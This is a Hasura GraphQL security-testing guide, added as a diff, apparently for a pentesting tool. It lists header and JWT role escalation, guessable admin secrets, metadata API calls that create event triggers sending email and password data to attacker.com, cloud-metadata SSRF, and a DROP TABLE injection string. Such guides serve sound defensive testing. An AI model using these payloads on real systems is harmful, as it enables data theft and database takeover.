@@ -1,0 +1,485 @@
+<hasura_security_guide>
+<title>HASURA GRAPHQL ENGINE SECURITY TESTING</title>
+
+<critical>Hasura auto-generates GraphQL APIs from databases, introducing unique security challenges. Testing must cover permission bypass, metadata API exposure, remote schema attacks, action/event trigger abuse, and JWT claim manipulation. Misconfigurations can expose entire databases.</critical>
+
+<scope>
+- Permission bypass techniques
+- Metadata API exposure
+- Remote schema attacks
+- Action/Event trigger abuse
+- JWT claim manipulation
+- Role-based access bypass
+- Subscription security
+</scope>
+
+<methodology>
+1. Identify Hasura endpoints and version.
+2. Test permission rules for bypass.
+3. Probe metadata API access.
+4. Analyze remote schemas and actions.
+5. Test JWT handling and role claims.
+6. Check subscription authorization.
+</methodology>
+
+<permission_bypass>
+<permission_testing>
+{% raw %}
+# Permission rule bypass:
+
+# 1. Role header manipulation:
+# Hasura uses X-Hasura-Role header
+GET /v1/graphql
+X-Hasura-Role: admin
+X-Hasura-Role: user
+
+# If no auth, try:
+X-Hasura-Admin-Secret: admin
+X-Hasura-Admin-Secret: hasura
+
+# 2. JWT role claim manipulation:
+# Modify role in JWT:
+{
+  "https://hasura.io/jwt/claims": {
+    "x-hasura-role": "admin",
+    "x-hasura-default-role": "admin",
+    "x-hasura-allowed-roles": ["admin", "user"]
+  }
+}
+
+# 3. Column permission bypass:
+# If column restricted, try nested selection:
+query {
+  users {
+    posts {
+      user {
+        email  # May bypass user.email restriction
+      }
+    }
+  }
+}
+
+# 4. Row-level security bypass:
+# Use related tables to access restricted rows
+query {
+  comments(where: {user_id: {_eq: 1}}) {
+    user {
+      secret_data  # Access via relationship
+    }
+  }
+}
+{% endraw %}
+</permission_testing>
+
+<filter_bypass>
+{% raw %}
+# Permission filter bypass:
+
+# 1. Aggregate bypass:
+# If select is denied but aggregate allowed:
+query {
+  users_aggregate {
+    nodes {
+      id
+      email
+    }
+  }
+}
+
+# 2. Boolean expression injection:
+# If filter uses user input:
+{_or: [{id: {_eq: 1}}, {id: {_neq: 0}}]}
+
+# 3. Computed field access:
+# Access restricted via computed fields
+query {
+  users {
+    computed_sensitive_data
+  }
+}
+
+# 4. Subscription bypass:
+# Permissions may differ for subscriptions
+subscription {
+  users {
+    secret_field
+  }
+}
+
+# 5. Nested permission bypass:
+# Deep nesting to avoid permission checks
+query {
+  table1 {
+    table2 {
+      table3 {
+        restricted_data
+      }
+    }
+  }
+}
+{% endraw %}
+</filter_bypass>
+</permission_bypass>
+
+<metadata_api>
+<metadata_exposure>
+{% raw %}
+# Metadata API access:
+
+# Check admin secret protection:
+POST /v1/metadata
+X-Hasura-Admin-Secret: {secret}
+Content-Type: application/json
+
+{
+  "type": "export_metadata",
+  "args": {}
+}
+
+# Common endpoints:
+/v1/metadata
+/v1/query
+/v1/graphql
+/v2/query
+/console
+
+# Schema introspection:
+POST /v1/graphql
+{
+  "query": "{ __schema { types { name fields { name } } } }"
+}
+
+# Reload metadata:
+{
+  "type": "reload_metadata",
+  "args": {}
+}
+
+# Get inconsistent metadata:
+{
+  "type": "get_inconsistent_metadata",
+  "args": {}
+}
+{% endraw %}
+</metadata_exposure>
+
+<metadata_manipulation>
+{% raw %}
+# Metadata manipulation attacks:
+
+# Add new permission:
+{
+  "type": "create_select_permission",
+  "args": {
+    "table": "users",
+    "role": "attacker",
+    "permission": {
+      "columns": "*",
+      "filter": {}
+    }
+  }
+}
+
+# Add remote schema:
+{
+  "type": "add_remote_schema",
+  "args": {
+    "name": "evil",
+    "definition": {
+      "url": "https://attacker.com/graphql"
+    }
+  }
+}
+
+# Create event trigger:
+{
+  "type": "create_event_trigger",
+  "args": {
+    "name": "evil_trigger",
+    "table": "users",
+    "webhook": "https://attacker.com/webhook",
+    "insert": {"columns": "*"}
+  }
+}
+
+# Drop table tracking:
+{
+  "type": "untrack_table",
+  "args": {
+    "table": "secrets"
+  }
+}
+{% endraw %}
+</metadata_manipulation>
+</metadata_api>
+
+<remote_schema>
+<remote_schema_attacks>
+{% raw %}
+# Remote schema exploitation:
+
+# 1. SSRF via remote schema:
+# If admin can add remote schemas:
+{
+  "type": "add_remote_schema",
+  "args": {
+    "name": "internal",
+    "definition": {
+      "url": "http://169.254.169.254/latest/meta-data/"
+    }
+  }
+}
+
+# 2. Remote schema takeover:
+# If remote schema URL is controllable:
+# Point to attacker GraphQL server
+
+# 3. Header injection:
+{
+  "definition": {
+    "url": "https://remote.com/graphql",
+    "headers": [
+      {"name": "Authorization", "value": "Bearer stolen_token"}
+    ]
+  }
+}
+
+# 4. Permission confusion:
+# Remote schema may have different permissions
+# Query remote schema fields directly
+
+# 5. Schema stitching vulnerabilities:
+# Naming conflicts between local and remote
+# Type confusion between schemas
+{% endraw %}
+</remote_schema_attacks>
+</remote_schema>
+
+<actions_triggers>
+<action_abuse>
+{% raw %}
+# Action handler exploitation:
+
+# 1. Action SSRF:
+# If action handler URL controllable:
+mutation {
+  customAction(input: {url: "http://internal:8080/admin"})
+}
+
+# 2. Input injection:
+mutation {
+  processData(input: {data: "'; DROP TABLE users; --"})
+}
+
+# 3. Webhook manipulation:
+# Event trigger webhooks
+# Point to internal services
+
+# 4. Async action exploitation:
+# Race conditions in async actions
+# State manipulation during processing
+
+# 5. Action permission bypass:
+# Actions may have different permission rules
+# Test without authentication
+{% endraw %}
+</action_abuse>
+
+<event_triggers>
+{% raw %}
+# Event trigger exploitation:
+
+# 1. Trigger webhook to attacker:
+# If can create/modify triggers:
+{
+  "type": "create_event_trigger",
+  "args": {
+    "webhook": "https://attacker.com/collect",
+    "insert": {"columns": ["id", "email", "password"]}
+  }
+}
+
+# 2. Event replay:
+# If events can be replayed:
+{
+  "type": "invoke_event_trigger",
+  "args": {
+    "name": "user_created",
+    "payload": {...}
+  }
+}
+
+# 3. Trigger DoS:
+# Create trigger causing infinite loop
+# Trigger on update -> webhook updates -> triggers again
+
+# 4. Data exfiltration:
+# Trigger sends all row data to webhook
+# Columns include sensitive data
+{% endraw %}
+</event_triggers>
+</actions_triggers>
+
+<jwt_attacks>
+<jwt_manipulation>
+{% raw %}
+# JWT claim manipulation:
+
+# Standard Hasura JWT claims:
+{
+  "https://hasura.io/jwt/claims": {
+    "x-hasura-default-role": "user",
+    "x-hasura-allowed-roles": ["user", "admin"],
+    "x-hasura-user-id": "123"
+  }
+}
+
+# Attack 1: Role escalation:
+# Modify x-hasura-default-role to "admin"
+
+# Attack 2: Allowed roles expansion:
+# Add "admin" to x-hasura-allowed-roles
+
+# Attack 3: Custom claim injection:
+# Add claims used in permission rules:
+"x-hasura-org-id": "target_org"
+"x-hasura-is-admin": "true"
+
+# Attack 4: Algorithm confusion:
+# alg: none
+# RS256 -> HS256
+
+# Attack 5: Weak secret:
+# Brute force JWT secret
+# Common: hasura, hasura-secret, admin
+{% endraw %}
+</jwt_manipulation>
+
+<auth_bypass>
+{% raw %}
+# Authentication bypass:
+
+# 1. No auth header:
+# Request without Authorization header
+# May fall back to anonymous role
+
+# 2. Invalid token handling:
+# Expired tokens
+# Malformed tokens
+# Empty tokens
+
+# 3. Admin secret as header:
+X-Hasura-Admin-Secret: {try_common_secrets}
+
+# 4. Webhook bypass:
+# If using auth webhook:
+# Manipulate webhook response
+# Time-based attacks
+
+# 5. Multiple auth methods:
+# Test all: JWT, webhook, admin secret
+# One may be misconfigured
+{% endraw %}
+</auth_bypass>
+</jwt_attacks>
+
+<subscription_attacks>
+<subscription_security>
+{% raw %}
+# Subscription security testing:
+
+# 1. Authorization in subscriptions:
+subscription {
+  users {
+    id
+    email
+    password_hash
+  }
+}
+
+# 2. Subscription to other users' data:
+subscription {
+  messages(where: {user_id: {_eq: "other_user"}}) {
+    content
+  }
+}
+
+# 3. Multiplexing abuse:
+# Many subscriptions on single connection
+# Resource exhaustion
+
+# 4. Live query manipulation:
+# Modify subscription during active session
+# Change filters after authorization
+
+# 5. Subscription data leak:
+# Real-time updates may leak data
+# Infer data from update patterns
+{% endraw %}
+</subscription_security>
+</subscription_attacks>
+
+<common_payloads>
+{% raw %}
+# Role bypass:
+X-Hasura-Role: admin
+X-Hasura-Admin-Secret: hasura
+
+# Metadata export:
+{"type": "export_metadata", "args": {}}
+
+# Permission bypass query:
+{users_aggregate { nodes { id email } }}
+
+# JWT manipulation:
+"x-hasura-default-role": "admin"
+
+# Subscription:
+subscription { users { password_hash } }
+
+# Remote schema SSRF:
+{"url": "http://169.254.169.254/"}
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate permission bypass accessing restricted data.
+2. Show metadata API access or manipulation.
+3. Prove JWT claim escalation to admin role.
+4. Document remote schema or action SSRF.
+5. Provide role-based access violation proof.
+</validation>
+
+<false_positives>
+- Properly configured permission rules
+- Secure JWT validation with strong secret
+- Metadata API protected by admin secret
+- Remote schemas with proper authorization
+- Actions with input validation
+- Subscriptions following same permissions as queries
+</false_positives>
+
+<impact>
+- Full database access via admin bypass
+- Data exfiltration through permission flaws
+- Privilege escalation via JWT manipulation
+- SSRF via remote schemas/actions
+- Real-time data leak via subscriptions
+- Backend system access through webhooks
+</impact>
+
+<pro_tips>
+1. Always test X-Hasura-Admin-Secret header.
+2. Try common admin secrets: hasura, admin, secret.
+3. Check aggregate queries for permission bypass.
+4. Test JWT with modified role claims.
+5. Probe metadata API endpoints.
+6. Check remote schema configurations.
+7. Test event triggers for webhook abuse.
+8. Verify subscription authorization.
+9. Look for permission gaps in nested queries.
+10. Document exact permission rules bypassed.
+</pro_tips>
+
+<remember>Hasura's auto-generated API requires careful permission configuration. A single misconfigured permission rule or exposed admin secret can compromise the entire database. Always test all access methods: direct queries, aggregates, subscriptions, and nested relationships.</remember>
+</hasura_security_guide>
